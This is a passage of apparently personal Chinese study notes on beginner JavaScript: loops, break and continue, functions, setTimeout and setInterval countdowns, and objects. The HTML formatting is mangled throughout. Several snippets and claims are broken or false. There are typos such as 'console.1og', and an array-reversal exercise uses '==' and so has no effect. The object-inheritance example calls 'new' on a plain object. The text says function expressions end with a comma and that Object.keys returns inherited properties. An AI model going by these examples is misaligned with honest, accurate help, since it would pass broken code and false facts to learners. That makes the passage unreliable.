0;循环条件: i &lt; 4;执行内容: console.1og(i); i++; 更新条件的表达式: i++;&gt; 注意:初始条件写在while循环外，更新条件的表达式写在执行内容里。案例：</code></pre><p>let peppaFriends = [‘小狗丹尼’, ‘小猫坎迪’, ‘狐狸弗雷迪’, ‘小狼温蒂’, ‘大象艾米丽’, ‘小兔瑞贝卡’, ‘小羊苏西’];</p><p>let i = 0;<br>while (i &lt; peppaFriends.length ) {<br>  console.log(peppaFriends[i]);<br>  i++;<br>}</p><pre><code>“当"i &lt; peppaFriends.length (即i &lt; 7) 时,执行console.log(peppaFriends[i)，并将i加1。一共执行7次，在最后一次循环中，i=6,符合while的判断条件，执行console语句打出最后一个数组元素， 并将i加至7。到此，已打印出所有的佩奇小伙伴了。#### do...while循环while循环有两种写法: while 和do..while。两者的区别在于先判断还是先执行:写法一: while 先判断，后执行。写法二: do...while, 先"do" (执行)，后while (判断)。![image](https://document.youkeda.com/P3-4-HTML-CSS/5/5.jpg)&gt; 同样的:初始条件写在while循环外，更新条件的表达式写在执行内容里。但因为do...while是先执行后判断的，所以一定会执行一次do之后的内容。比如:</code></pre><p>let i = 0;</p><p>do {<br>  console.log(i); // 输出：0<br>  i++;<br>} while (i &lt; 0 );</p><pre><code>#### 5.3跳出循环（birek和continue）</code></pre><p>let num = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368];</p><p>for(let i = 0;i &lt; num.length;i++) {<br>  if (num[i]%5 === 0) {<br>    console.log(num[i]);<br>    // 用 break 跳出循环<br>    break;<br>  }<br>}</p><p>// 循环之后的语句<br>console.log(“循环之后的语句”);</p><pre><code>break的作用就是跳出循环，不管循环有没有结束都不会再继续下去，而是直接执行循环之后的语句。如果我们要把数组中所有不能被5整除的元素做统一处理，比如除以5并打印，那么我们在遇到能被5整除的数字时，应该不作处理直接进行下一次循环。跳过循环中的某一次迭代，我们可以使用"continue"。</code></pre><p>let num = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368];</p><p>for(let i = 0;i &lt; num.length;i++) {<br>  if (num[i]%5 === 0) {<br>    // 用 continue 跳出符合条件的这一次迭代<br>    console.log(“跳过了第” + (i + 1) + “个数：” + num[i]);<br>    continue;<br>  }<br>  const handledNum = num[i] / 5;<br>  console.log(handledNum);<br>}</p><p>// 循环之后的语句<br>console.log(“循环之后的语句”);</p><pre><code>区别：break是终止整个循环,而continue是结束当前迭代，进入下一次迭代，并不会终止循环。案例：</code></pre><p>let num = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368]</p><pre><code>请用for循环找到最后一个17整除的数字并打印该数字。</code></pre><p>let num = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368];</p><p>let num1 =[];</p><p>let count = num.length;</p><p>for(let i = 0; i &lt; num.length; i++){<br>  num1[i] == num[count-i];<br>}</p><p>for(let i = 0; i &lt; num.length; i++){<br>  if(num[i] % 17 == 0){<br>    console.log(num[i]);<br>  }<br>}</p><pre><code>## 第六章 函数### 6.1函数概述函数是一段可以反复调用的代码块，往往能够实现一个特定的功能。它可以解决代码重复的问题。在JavaScript中，函数是头等(first-class)对象，有时我们也可称其为方法。**获取随机函数**下面这句代码中的Math.random()就是js的内置函数。Math是一个内置对象，用于执行数学任务。</code></pre><p>const num = Math.random();</p><pre><code>通过.上面这行代码，我们可以获得-个范围在[0, 1)之间的随机数。即从0 (包括0)往上,但是不包括1 (排除1)。如果我们要获取一一个三位数随机数，即范围在[100, 1000) 之间，那么我们可以这么做:1. 先获取[0, 1000)之间的随机数:```const num = Math. random() * 1000 ;```2. 再获取[100, 1000)之间的随机数要获取[100, 1000)的数，那么Math.random()应该属于[0.1, 1)。我们处理一下:</code></pre><p>// num1的范围是[0.1, 1)<br>const num1 = Math. random() * 0.9 + 0.1;<br>// num2的范围是[100， 1000)<br>const num2 = Math. floor(num1 * 1000);<br>console.log(num2);</p><pre><code>&gt; Math.floor(x)是js内置方法,返回于x的最大整数。比如，Math.floor(2.3)返回2, Math.floor(4.9) 返迥4。### 6.2自定义函数#### 函数的声明##### 1.用function声明![image](https://document.youkeda.com/P3-4-HTML-CSS/6/1.jpg)要注意，用function命令声明函数有四个东西缺一不可: 1. 关键词"function" ;2. 函数名"print"，当然，这个名称是自己取的; 3. 函数名之后的小括号”0”;4. 包裹函数体用的大括号"{}”，"{"中可以没有代码;调用：</code></pre><p>print(); // 调用格式为：函数名 + ()</p><pre><code>##### 2.用函数表达式声明![image](https://document.youkeda.com/P3-4-HTML-CSS/6/2.jpg)这种写法将一个匿名函数赋值给变量。赋值等号右边为匿名函数,又称函数表达式。注意，采用函数表达式声明函数时，function 命令后面不带有函数名。调用的时候和用function命令声明的函数调用一样,函数名+ ()。这里的函数名指的是变量名。</code></pre><p>print();</p><pre><code>案例</code></pre><p>let print = function() {<br>  console.log(“JavaScript 真有趣”);<br>};</p><p>print();<br>print();</p><pre><code>es6中函数表达式声明可以用箭头函数简写为:</code></pre><p>let print = () =&gt; {<br>console.log(“JavaScript真有趣”);<br>};</p><pre><code>**函数声明的提升**采用function命令声明函数时，整个函数会被提升到代码头部。所以,下面的代码不会报错:</code></pre><p>f();<br>function f() {}</p><pre><code>在上面的代码中，看起来函数f的调用在前，声明在后，但其实因为用function命令声明函数时函数声明会被提升到代码头部，所以上面的代码相当于:</code></pre><p>//被提升到头部<br>function f() {}<br>f();</p><pre><code>但是用函数表达式声明函数的时候不存在函数声明提升，编译的时候就会报错。**两种声明方式的区别**1. 结尾的大括号后是否需要加”:”:- function命令声明:结尾的大括号后不需要加”,"- 函数表达式:结尾的大括号后需要加”,"2. 有无声明提升:- function命令声明:有提升;- 函数表达式:没有提升;因为函数表达式是一个表达式，所以要加”,”。总的来说两种声明方式的区列还是比较小的。**函数的重复声明**如果同一个函数被多次声明，后面的声明就会覆盖前面的声明。</code></pre><p>function print() {<br>console. log(“JavaScript真有趣”);<br>}<br>function print() {<br>console. log(“JavaScript真有趣…个鬼嘞”);<br>}<br>print();</p><pre><code>运行结果:</code></pre><p>JavaScript真有趣…个鬼嘞</p><pre><code>前一次声明在任何时候都是无效的，这一点要特别注意。**立即执行函数**当函数只使用一次时,通常使用IIFE (Immediately Invokable Function Expressions):</code></pre><p>(function() {<br>console.1og(“这个函数只执行一次”);<br>})();</p><pre><code>它会在函数声明后立即调用函数，除这一次调用外因为是匿名函数，所以无从调用。案例：六位数随机数：</code></pre><p>// 声明函数 code<br>function code(){<br>  let num = (Math.random() * 0.9 + 0.1) *1000000;<br>  let num1 = Math.floor(num);<br>  console.log(num1)<br>}<br>// 调用函数 code<br>code();</p><pre><code>### 6.3函数参数解决之前的问题，我们可以通过参数给函数传数据：</code></pre><p>// 在圆括号运算符中加入参数 figure，用来接收外部传入的数据<br>function code(figure) {<br>  const num1 = Math.random() * 0.9 + 0.1;<br>  const num2 = Math.floor(num1 * Math.pow(10, figure));</p><p>  console.log(num2);<br>}</p><p>// 不要忘记调用函数，调用函数后函数才会执行<br>code(4);<br>code(6);</p><pre><code>&gt; 上面Math.pow(x,y)是js内置方法,求取x的y次幂。比如,Math.pow(10, 4)的计算结果为10000。**多个参数**函数可以接受多个参数，多个参数以","(英文逗号)分隔:</code></pre><p>// 参数 figure(位数) txt(文本)<br>function code(figure, txt) {<br>  const num1 = Math.random() * 0.9 + 0.1;<br>  const num2 = Math.floor(num1 * Math.pow(10, figure));</p><p>  console.log(txt + num2);<br>}</p><p>code(6, “六位随机数：”);</p><pre><code>&gt; 调用函数时，需要按顺序传入数据。**参数数量和传入数量不匹配**如果传入的数据个数超过了函数的参数:</code></pre><p>// 参数 figure(位数) txt(文本)<br>function code(figure, txt) {<br>  const num1 = Math.random() * 0.9 + 0.1;<br>  const num2 = Math.floor(num1 * Math.pow(10, figure));</p><p>  console.log(txt, num2);<br>}</p><p>code(6, “六位随机数：”, “第三个参数”);</p><pre><code>结果：</code></pre><p>六位随机数：556540</p><pre><code>结果并没有受到影响，这是因为JavaScript允许传入任意个参数而不影响调用，因此传入的参数比定义的参数多也没有问题。这一点和Java有区别，在JavaScript中这样是不会报错的。</code></pre><p>// 参数 figure(位数) txt(文本)<br>function code(figure, txt) {<br>  const num1 = Math.random() * 0.9 + 0.1;<br>  const num2 = Math.floor(num1 * Math.pow(10, figure));</p><p>  console.log(txt, num2);<br>}</p><p>code(6);</p><pre><code>打印结果：</code></pre><p>undefined 556540</p><pre><code>**参数默认值**像上面传入的数据的个数比定，义的参数少的情况，很容易出现运行结果与预期不符的情况，为了防止这种问题，我们可以给参数设置默认值:</code></pre><p>// 参数 figure(位数) txt(文本)<br>function code(figure, txt = “随机数：”) {<br>  const num1 = Math.random() * 0.9 + 0.1;<br>  const num2 = Math.floor(num1 * Math.pow(10, figure));</p><p>  console.log(txt, num2);<br>}</p><p>code(6);</p><pre><code>结果</code></pre><p>随机数： 556540</p><pre><code>因为对应的参数txt未传入数据，所以在函数中取默认值: "随机数:”这里注意写法，我们是用等号=给参数赋默认值的。案例：声明一个名为padZeros的函数,用来格式化数字,用0在左侧补位,使产生的字符串达到给定的长度,如果原数字长度超出给定长度则不作处理。比如:数字42，长度5,打印出: 00042;数字123，长度3,打印出: 123;数字1234，长度3,打印出: 1234;</code></pre><p>/*function padZeros(num, totalLen) {<br>  // 将数字转为字符串<br>  let numStr = num.toString();</p><p>  // 计算所需 0 的个数<br>  let count = numStr.length;<br>  let zero = totalLen - count;</p><p>  // 用 0 补位<br>  let str = ‘’;<br>  if (totalLen - count &gt; 0) {<br>    for (let i = 0; i &lt; totalLen - count; i++) {<br>      str += ‘0’ ;<br>    }<br>  } else{</p><p>  }</p><p>  // 打印得到的结果<br>  console.log(str+numStr);</p><p>}</p><p>padZeros(42, 5);<br>padZeros(123, 3);<br>padZeros(1234, 3);<br>*/</p><p>function padZeros(num, totalLen) {<br>  // 将数字转为字符串<br>  let numStr = num.toString();<br>  // 计算所需 0 的个数<br>  let numZeros = totalLen - numStr.length;<br>  // 用 0 补位<br>  for (let i = 1; i &lt;= numZeros; i++) {<br>     numStr = “0” + numStr;<br>  }<br>  console.log(numStr);<br>}</p><p>padZeros(42, 5);<br>padZeros(123, 3);<br>padZeros(1234, 3);</p><pre><code>#### 6.4函数的返回值和其他编程语言一样, js中函数可以分为"无返回值"和”有返回值”两种，之前我们写的自定义函数都是无返回值函数，这里我们要来讲讲有返回值函数。</code></pre><p>let num = Math. random();</p><pre><code>Math.random()就是一个有返回值的内置函数，它会返回生成的随机数。现在我们改造一下之前写的可定制位数的随机数函数,写个有返回值的自定义函数:</code></pre><p>// 参数 figure(位数)<br>function code(figure) {<br>  const num1 = Math.random() * 0.9 + 0.1;<br>  const num2 = Math.floor(num1 * Math.pow(10, figure));</p><p>  // 用“return”把生成的随机数作为函数的结果返回<br>  return num2;<br>}</p><p>let result = code(6);<br>console.log(result);</p><pre><code>结果为 556556验证码：</code></pre><p>// 用户输入的验证码<br>let userCode = 682314;</p><p>// 参数 figure(位数)<br>function code(figure) {<br>  const num1 = Math.random() * 0.9 + 0.1;<br>  const num2 = Math.floor(num1 * Math.pow(10, figure));</p><p>  return num2;<br>}</p><p>let result = code(6);</p><p>// 后续的验证<br>if (result === userCode) {<br>  console.log(“验证码正确”);<br>} else {<br>  console.log(“验证码错误”);<br>}</p><pre><code>从上面的例子中我们知道，在函数中使用return可以返回return语句所带的那个表达式。那如果在return语句之后，还有别的语句，这些语句还会执行吗?答案是不会。**函数中return后的语句将不会执行**案例：函数完成斐波拉契数</code></pre><p>function fib(num) {</p><p>  let n = 0;<br>  let prev1 = 1;<br>  let prev2 = 1;</p><p>  for (let i = 0; i &lt; num; i++) {<br>    if (i === 0 || i === 1) {<br>      n = 1;<br>    } else {<br>      n = prev1 + prev2;<br>      prev1 = prev2;<br>      prev2 = n;<br>    }<br>  }<br>  return prev2;<br>}</p><p>const num = fib(30);<br>console.log(num);</p><pre><code>### 6.5内置函数——计数器1我们常在注册、登录时遇到验证手机号的情况，点击获取验证码之后,为了防止用户频繁获取验证码，我们会在点击获取后开始倒计时60s,在这段时间里，用户不能再次获取验证码。倒计时每一秒会更新一下，这个可以用js提供的定时执行代码函数setTimeout()和setInterval)来完成。这个定时执行代码的功能，叫做定时器(timer)。**延时执行**setTimeout函数用来指定某个函数或某段代码，在多少毫秒之后执行。它返回一个整数，表示定时器的编号，以后可以用来取消这个定时器。![image](https://document.youkeda.com/P3-4-HTML-CSS/6/3.jpg)setTimeout函数接受两个参数，第一个参数func|code是将要推迟执行的函数名或者一段代码，第二个参数delay是推迟执行的毫秒数。以下是setTimeout的三种写法，大家关注它第一个参数的写法和运行顺序:</code></pre><p>console.log(1);</p><p>/**</p><ul><li>第一个参数是代码，注意代码需用引号包裹，否则会立即执行代码</li><li>第二个参数是 1000，即 1000ms 后执行 console.log(2)</li><li>/<br>setTimeout(‘console.log(2)’, 1000);</li></ul><p>/**</p><ul><li>第一个参数是匿名函数</li><li>第二个参数是 2000，即 2s 后执行 console.log(3)</li><li>/<br>setTimeout(function () {<br>console.log(3);<br>}, 2000);</li></ul><p>// 第一个参数是函数名，注意函数名后不要加小括号“()”，否则会立即执行 print4<br>setTimeout(print4, 3000);</p><p>console.log(5);</p><p>function print4() {<br>  console.log(4);<br>}</p><pre><code>结果</code></pre><p>1;<br>5;<br>2;<br>3;<br>4;</p><pre><code></code></pre><p>// 立即执行<br>console.log(1);<br>// 立即执行<br>console.log(5);<br>// 1s 后执行<br>console.log(2);<br>// 2s 后执行<br>console.log(3);<br>// 3s 后执行<br>print4(); // 即：console.log(4)</p><pre><code>从运行结果可以看出，setTimeout可以指定某个函数或某段代码，在多少毫秒之后执行，执行一次。现在我们用setTimeout来做验证码的60s倒计时，目标效果是每隔一秒打印出剩余秒数。虽然setTimeout只能执行一次，但是我们可以用递归的方式来写计时器。每隔一秒会执行一次代码，每次执行的代码要能够：1. 打印剩余秒数;2. 将秒数减一;3. 如果剩余秒数&gt;0，则调用setTimeout在一秒后重复上述的1、2、3,否则不再调用，并清除计时器，即计时结束;案例：</code></pre><p>// 首先定义计时总秒数，单位 s<br>let i = 60;</p><p>// 定义变量用来储存定时器的编号<br>let timerId;</p><p>// 写一个函数，这个函数即每次要执行的代码，能够完成上述的 1、2、3<br>function count() {<br>  console.log(i);<br>  i–;<br>  if(i &gt; 0) {<br>    timerId = setTimeout(count,1000);<br>  } else {<br>    // 清除计时器<br>    clearTimeout(timerId);<br>  }<br>}<br>// 首次调用该函数，开始第一次计时<br>count();</p><pre><code>案例写一个正整数的计时器，每隔一秒打印出0到10。代码运行后立即打印出0，第一秒后打印出1，第二秒后打印出2,最后打印出10。</code></pre><p>// 首先定义计时开始的数字<br>let i = 0;</p><p>// 写一个函数，这个函数即每次要执行的代码<br>  function print() {<br>  // 打印计时数字<br>  console.log(i);<br>  let id;<br>  // 每执行一次计时数字要加一<br>  i++;<br>  // 判断是否要继续执行打印函数<br>  if(i &lt;= 10){<br>    id = setTimeout(print, 1000);<br>  } else {<br>    clearTimeout(id);<br>  }<br>}</p><p>// 首次调用该函数，开始第一次打印<br>print();</p><pre><code>#### 6.6内置函数——计时器2下面我们来看setInterval,它的用法与setTimeout完全一致, 区别仅仅在于setInterval指定某个任务每隔一段时间就执行一次，也就是无限次的定时执行。**无限调用setInterval**![image](https://document.youkeda.com/P3-4-HTML-CSS/6/4.jpg)现在我们用setInterval来实现隔1s 打印数字1:</code></pre><p>print();<br>let timer = setInterval(print, 1000);<br>function print() {<br>  console.log(1);<br>}</p><pre><code>可以看到，上述代码能够每隔1s打印数字1,但是这离我们的计时器还有三个地方需要改进:1. 上述代码是在1s后开始第一次打印，而计时器是立即进行第一次打印(打印60)，1s后再进行第二次打印的;2. 每次打印的数字是不同的;3. 计时器是有限次数,不是无限调用;第一步：</code></pre><p>print();<br>let timer = setInterval(print, 1000);</p><p>function print() {<br>  console.log(1);<br>}</p><pre><code>第二部：</code></pre><p>let i = 60;<br>print();<br>let timer = setInterval(print, 1000);</p><p>function print() {<br>  console.log(i);<br>  i–;<br>}</p><pre><code></code></pre><p>第三步：<br>let i = 60;<br>print();<br>let timer = setInterval(print, 1000);</p><p>function print() {<br>  console.log(i);<br>  i–;<br>  if (i &lt; 1) {<br>    clearInterval(timer);<br>  }<br>}</p><pre><code>最终：</code></pre><p>let i = 60;<br>print();<br>let timer = setInterval(print, 1000);</p><p>function print() {<br>  console.log(i);<br>  i–;<br>  if (i &lt; 1) {<br>    clearInterval(timer);<br>  }<br>}</p><pre><code>案例：写一个正整数的计时器，每隔一秒打印出0到10。代码运行后立即打印出0，第一秒后打印出1，第二秒后打印出2，最后打印出10。</code></pre><p>let i = 0;</p><p>print();</p><p>let count = setInterval(print,1000);</p><p>function print(){<br>  console.log(i);<br>  i++<br>  if(i &gt; 10){<br>    clearInterval(count);<br>  }<br>}</p><pre><code>## 第七章 对象### 7.1对象概述什么是对象?简单说，对象就是一组" 键值对”(key-value) 的集合,是一种无序的复合数据集合:![image](https://document.youkeda.com/P3-4-HTML-CSS/7/1.jpg)- 大括号:定义一个对象;- person:定义的对象被赋值给person, 则person将指向这个对象;- `name:'henry'`:键值对(key: value)，键值之间用:隔开;- age: 18:键值对(key: value) ;- 一个对象中可以包含多个键值对，每个键值对之间用,隔开,最后一个键值对后可以加,，也可以不加。</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>  run: function() {<br>    console.log(‘running’);<br>  }<br>}</p><p>person.run();</p><pre><code>会输出running让我们来实操一下，用构造函数来创建person对象:</code></pre><p>// 第一步：创建构造函数<br>function People(name, age) {<br>  this.name = name;<br>  this.age = age;<br>}</p><p>// 第二步：通过 new 创建对象实例<br>let person = new People(‘henry’, 18);<br>console.log(person);</p><pre><code>案例：通过构造函数创建-个名称为benz (奔驰)的对象，构造函数名为Car,对象实例benz有四个属性:1. name,表示车的品牌名，值为Benz;2. founder ，表示创始人，值为Karl Benz;3. gmtCreated，表示品牌发明汽车的时间，值为数字1886,表示1886年;4. run,这是一个方法，这个方法会在控制台console中输出"Benz is running..";</code></pre><p>function Car(name, founder, gmtCreated, run) {<br>  this.name = name;<br>  this.founder = founder;<br>  this.gmtCreated = gmtCreated;<br>  this.run = run;<br>}</p><p>let benz = new Car(‘Benz’, ‘Karl Benz’, ‘1886’, function() {<br>  console.log(‘Benz is running…’);<br>});</p><pre><code>#### 7.2自定义对象的属性操作**属性的读取**JavaScript中有两种方法读取一个对象的属性:点运算符和方括号运算符。</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18<br>}</p><p>console.log(person.name);<br>console.log(person[‘name’]);</p><pre><code></code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18<br>}</p><p>let variable = ‘name’;<br>console.log(person[variable]);</p><p>variable = ‘age’;<br>console.log(person[variable]);</p><pre><code>这里我们定义了一个变量`variable`,在读取对象属性的时候，使用了方括号运算符，然后在方括号中使用了变量`variable` 解读一下:第一次打印:`variable`的值为字符串name,因此读取的是person对象的name属性;第二次打印:`variable`的值为字符串age,因此读取的是person对象的age属性;我们已经知道，对象中属性的值可以是任何数据类型，那如果某个属性的值是对象，该怎么读取这个键值对象中的属性呢?我们还是用，点运算符或者方括号运算符:</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>  parents: {<br>    papa: ‘jack’,<br>    mama: ‘mary’<br>  }<br>}</p><p>console.log(person.parents.papa);<br>console.log(person[‘parents’][‘mama’]);</p><pre><code>**属性的赋值**</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18<br>}</p><p>person.name = ‘tom’;<br>person[‘age’] = 10</p><p>console.log(person.name);<br>console.log(person.age);</p><pre><code>**属性的查看**查看一个对象本身的所有属性，可以使用Object.keys方法 :</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18<br>}</p><p>console.log(Object.keys(person));</p><pre><code>&gt; 上述代码中的Object,是JavaScript提供的基本对象，JavaScript 的&gt; 所有其他对象都继承自Object对象，即那些对象都是0bject的实例。&gt; keys是Object对象的一个静态方法。**属性的删除和修改**当想要删除对象中的某个属性，可以用delete：</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18<br>}</p><p>delete person.name;</p><p>console.log(person);</p><pre><code>增加属性：</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18<br>}</p><p>person.gender = ‘male’;</p><pre><code>案例：请看上述代码，我们通过字面量方法创建了一个对象person,这个人叫henry,现在请你为henry添加一个sayHello方法,每次执行该方法，henry 都会在控制台输出"hello, I am henry"。要求:1. 给henry添加一个方法sayHello;2. 调用一次sayHello方法;注意，在sayHello方法中，我们可以用this.name取到对象person的name属性值哦。</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>  run: function() {<br>    console.log(‘running’);<br>  },<br>  sayHello: function() {<br>    console.log(‘hello, I am ‘ + this.name);<br>  }<br>};</p><p>person.sayHello();</p><pre><code>案例：</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>  run: function() {<br>    console.log(‘running’);<br>  },<br>  sayHello: function() {<br>    console.log(‘hello, I am ‘ + this.name);<br>  }<br>}</p><pre><code>请看上述代码，我们通过字面量方法创建了一个对象person,这个人叫henry,我们都知道，人是会长大,请给henry添加一个方法grow,每执行一次该方法，henry将长大一岁，即age会加一。要求:1. 给henry添加一个方法grow; .2. 调用一次grow方法;注意，在grow方法中我们会修改age的值，那么如何读取并修改age的值呢，可以参考一下sayHello方法中对name的读取方法哦。</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>  run: function () {<br>    console.log(‘running’);<br>  },<br>  sayHello: function () {<br>    console.log(‘hello, I am ‘ + this.name);<br>  },<br>  grow: function () {<br>    this.age++;<br>  },<br>};</p><pre><code>### 7.3遍历对象属性如果想要在一个对象中查找某个符合条件的属性，我们就需要遍历对象了。在JavaScript中我们可以通过`for...in` 或借助`object.keys`来实现。#### 用`dor...in`遍历属性我们先来看如何用`for...in`遍历对象中的各个属性:</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>}</p><p>for (var key in person) {<br>  console.log(‘键名：’ + key + ‘；键值：’ + person[key]);<br>}</p><pre><code>#### 借助`Object.keys`属性于Object.keys方法返回的是-个由对象中所有属性名组成的数组，我们可以借助这一点来遍历对象:</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>}</p><p>let keys = Object.keys(person);</p><p>for (let i = 0; i &lt; keys.length; i++) {<br>  console.log(‘键名：’ + keys[i] + ‘；键值：’ + person[keys[i]]);<br>}</p><pre><code>案例：请看上述代码，根据给出的提示补全`??`处的代码，在控制台中打印出所有的键值对，打印结果如下:</code></pre><p>使用 for…in：<br>name: henry<br>age: 18<br>papa: jack<br>mama: mary<br>sister: jane</p><pre><code>注意，当属性名为family时，不能直接打印值，需要对family也进行循环(循环的key请用"familyKey"作为变量名哦)，打印出family中的键值对。请勿删除注释的代码哦。</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>  family: {<br>    papa: ‘jack’,<br>    mama: ‘mary’,<br>    sister: ‘jane’<br>  }<br>};</p><p>// 使用 for…in<br>function byForIn(obj) {<br>  // 循环 obj（person）对象<br>  for (const key in obj) {<br>    if (key === ‘family’) {<br>      const family = obj.family;<br>      // 循环打印 person.family<br>      for (const familyKey in family) {<br>        console.log(familyKey + ‘:’ + family[familyKey]);<br>      }<br>    } else {<br>      console.log(key + ‘:’ + obj[key]);<br>    }<br>  }<br>}</p><p>// 借助 Object.keys<br>function byKeys(obj) {<br>  const keys = Object.keys(obj);</p><p>  for (let i = 0; i &lt; keys.length; i++) {<br>    if (keys[i] === ‘family’) {<br>      // 获取 person.family 的所有属性<br>      const familyKeys = Object.keys(obj.family);</p><pre><code>  for (let i = 0; i &lt; familyKeys.length; i++) {    // 打印 person.family 中的键值对    console.log(familyKeys[i] + ':' + obj.family[familyKeys[i]]);  }} else {  // 打印 person 中除了 family 外的键值对  console.log(keys[i] + ':' + obj[keys[i]]);}</code></pre><p>  }<br>}</p><p>console.log(‘使用 for…in：’);<br>byForIn(person);</p><p>console.log(‘————————‘);</p><p>console.log(‘借助 Object.keys：’);<br>byKeys(person);</p><pre><code>### 7.4对象的继承我们知道，Java中是有”继承"这个概念的，在JavaScript也有。之前我们也提到过:&gt; Object是JavaScript提供的基本对象，JavaScript的所有其他对象都继承自Object对象，即那些对象都是Object的实例。keys是Object对象的一个静态方&gt; 法。就是说，我们之前学习的“自定义对象”，实就是继承自JavaScript提供的Object对象的。因此，除了用”字面量”和自定义的构造方法创建对象外,我们还可以用JavaScript提供的构造函数Object()或者”继承”来创建对象:</code></pre><p>// 字面量<br>let o1 = {<br>  name: ‘alice’,<br>};</p><p>// 构造函数<br>let o2 = new Object();<br>let o3 = new Object();</p><p>// 继承<br>let o4 = new o1();</p><pre><code>在上面的代码中，最后一种方法创建的o4对象继承自o1，那么o1就是o4的原型。#### 原型什么是原型，原型其实也是JavaScript中的一个对象。那为什么要提出原型的概念呢，这是为了找对象继承的上一级对象。o1继承自Object,Object就是01的原型。o4继承自01, o1就是o4的原型。一个对象，它称呼继承的上一级对象为原型，它自己也可以称作原型链下一级对象的原型。#### 属性是否存在：in我们可以用in运算符来判断对象是否拥有某个属性:</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>};</p><p>‘name’ in person;<br>‘gender’ in person;<br>‘toString’ in person;</p><pre><code>输出：</code></pre><p>true;<br>false;<br>true;</p><pre><code>`toString`是Object对象的属性。person 继承自Object所以也有这个属性。可见，由于继承的存在，一个对象中的属性分成了两类:继承属性和自身属性。之前我们用到的Object.keys方法返回的属性就包括了这两种属性。那么我们要如何判断对象自身属性中是否拥有某个属性呢?这个也不难，我们可以用Object对象提供的hasOwnProperty方法进行判断。#### 自身属性是否存在：hasOwnProperty</code></pre><p>let person = {<br>  name: ‘henry’,<br>  age: 18,<br>};</p><p>person.hasOwnProperty(‘name’);<br>person.hasOwnProperty(‘gender’);<br>person.hasOwnProperty(‘toString’);</p><pre><code>输出：</code></pre><p>true;<br>false;<br>false;</p><pre><code>可以看到toString不属于对象person的自身属性。#### Object与JSON、Map的区别JavaScript中有几个写法和对象长得相似的概念,JSON、 Map,大家了解即可。**JSON**JSON是一种轻量级的文本数据交换格式，它用JavaScript的语法书写，但独立于这种语言，可以认为这是编程语言间用于传递数据而约定的数据格式。**JSON格式和JavaScript对象的转换**1. JSON.parse():JSON格式=&gt;JavaScript对象</code></pre><p>// 一个 JSON 字符串<br>const jsonStr =<br>  ‘{“sites”:[{“name”:”Runoob”, “url”:”<a href="http://www.runoob.com&quot;},{&quot;name&quot;:&quot;Google&quot;">www.runoob.com"},{"name":"Google"</a>, “url”:”<a href="http://www.google.com&quot;},{&quot;name&quot;:&quot;Taobao&quot;">www.google.com"},{"name":"Taobao"</a>, “url”:”<a href="http://www.taobao.com&quot;}]}'">www.taobao.com"}]}'</a>;</p><p>// 转成 JavaScript 对象<br>const obj = JSON.parse(jsonStr);</p><pre><code>2. JSON.stringify(): JavaScript 对象=&gt; JSON格式现在我们把上面得到的obj转成JSON格式:</code></pre><p>const jsonStr2=JSON.stringify(obj)；</p><pre><code>**Map**Map和Object很相似，都可以保存键值对，但是他们仍有些重要的区别:1. 一个Object的键通常是字符串，但一个Map的键可以是任意值，包括函数、对象、基本类型，因此Map方便很多;2. Map中的键值是有序的，而添加到对象中的键则不是;3. Map的键值对个数可以直接获取，Object 则要借助Object.keys()等计算得到;4. Map可直接进行迭代，Object则要借助Object.keys()等;5. Map不存在键名和原型键名冲突问题，可以直接覆盖，Object则不行;从某种程度上来说，Map比Object更灵活方便，但是考虑到Map不能直接转为JSON格式进行通讯，所以我们可以把Map作为Object的补充来使用。案例：请按照提示补全代码，在控制台输出myObj对象的所有非继承属性。预期输出结果如下:</code></pre><p>type: Dot syntax<br>str: String value<br>random: Random Number</p><pre><code>代码：</code></pre><p>let myObj = new Object();<br>let rand = ‘random’;</p><p>myObj.type = ‘Dot syntax’;<br>myObj[‘str’] = ‘String value’;<br>myObj[rand] = ‘Random Number’;</p><p>for (const key in myObj) {<br>  if (myObj.hasOwnProperty(key)) {<br>    console.log(key + ‘: ‘ + myObj[key]);<br>  }<br>}</p><pre><code>### 7.5内置对象————Math、storage#### Math对象在上一章写随机数的时候我们用到了Math.random方法，其实Math也是JavaScript的一个原生对象，它能提供各种数学功能。该对象不是构造函数，不能生成实例，所有的属性和方法都必须在Math对象上调用。之前我们已经接触了Math.random 和Math.floor方法。现在我们来看看Math提供的其他用途。**常量**Math对象的静态属性，提供以下一些数学常数: </code></pre><p>Math.E // 常数e。<br>Math.LN2 // 2 的自然对数。<br>Math.LN10 // 10 的自然对数。<br>Math.LOG2E // 以 2 为底的e的对数。<br>Math.LOG10E // 以 10 为底的e的对数。<br>Math.PI // 常数π。<br>Math.SQRT1_2 // 0.5 的平方根。<br>Math.SQRT2 // 2 的平方根。</p><pre><code>我们会用到比较多的一般是常数π，即Math.Pl。**静态方法**Math对象提供以下一些静态方法:</code></pre><p>Math.abs() // 绝对值<br>Math.ceil() // 向上取整<br>Math.floor() // 向下取整<br>Math.round() // 四舍五入取整<br>Math.max() // 最大值<br>Math.min() // 最小值<br>Math.pow() // 指数运算<br>Math.sqrt() // 平方根<br>Math.log() // 自然对数<br>Math.exp() // e的指数<br>Math.random() // 随机数</p><pre><code>&gt; 